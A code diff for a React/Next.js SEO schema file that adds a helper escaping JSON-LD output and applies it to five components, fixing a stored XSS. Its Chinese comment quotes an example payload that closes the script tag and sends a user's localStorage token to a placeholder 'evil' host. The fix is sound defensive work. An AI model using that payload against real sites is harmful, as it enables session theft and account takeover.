@@ -5,6 +5,25 @@
 
 const BASE_URL = process.env.NEXT_PUBLIC_BASE_URL || 'https://skills.rehomi.com';
 
+/**
+ * JSON-LD 安全序列化（2026-10-12 二轮质检 H-1，存储型 XSS 修复）。
+ *
+ * `JSON.stringify` **不转义** `<` / `>` / `&`，而 HTML 解析器遇到 `</script>`
+ * 会提前终止脚本块：用户可控字段（昵称 / 团名 / 技能名 / 简介）里注入
+ * `</script><script>fetch('//evil/'+localStorage.token)</script>` 即可在
+ * 受害者浏览器同源执行 → 读走 JWT → 账号接管（管理员中招 = 全站沦陷）。
+ *
+ * 统一转义为 `\u003c` / `\u003e` / `\u0026`：JSON 解析器会还原成原字符
+ * （SEO 消费方无感），HTML 解析器看不到 `</script>` 序列。**所有**
+ * dangerouslySetInnerHTML 注入 JSON-LD 的位置必须走本函数。
+ */
+export function jsonLdHtml(data: unknown): string {
+  return JSON.stringify(data)
+    .replace(/</g, '\\u003c')
+    .replace(/>/g, '\\u003e')
+    .replace(/&/g, '\\u0026');
+}
+
 /* ── WebSite ────────────────────────────────────── */
 
 export function WebSiteSchema() {
@@ -25,7 +44,7 @@ export function WebSiteSchema() {
     },
   };
 
-  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;
+  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: jsonLdHtml(data) }} />;
 }
 
 /* ── Organization ───────────────────────────────── */
@@ -43,7 +62,7 @@ export function OrganizationSchema() {
     ] as string[],
   };
 
-  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;
+  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: jsonLdHtml(data) }} />;
 }
 
 /* ── SoftwareApplication (Skill detail) ──────────── */
@@ -106,7 +125,7 @@ export function SkillSchema(skill: {
     },
   };
 
-  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;
+  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: jsonLdHtml(data) }} />;
 }
 
 /* ── ItemList (Skills listing page) ──────────────── */
@@ -124,7 +143,7 @@ export function SkillListSchema({ skills }: { skills: Array<{ name: string; slug
     })),
   };
 
-  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;
+  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: jsonLdHtml(data) }} />;
 }
 
 /* ── BreadcrumbList ──────────────────────────────── */
@@ -142,5 +161,5 @@ export function BreadcrumbSchema({ items }: { items: Array<{ name: string; url: 
     })),
   };
 
-  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }} />;
+  return <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: jsonLdHtml(data) }} />;
 }
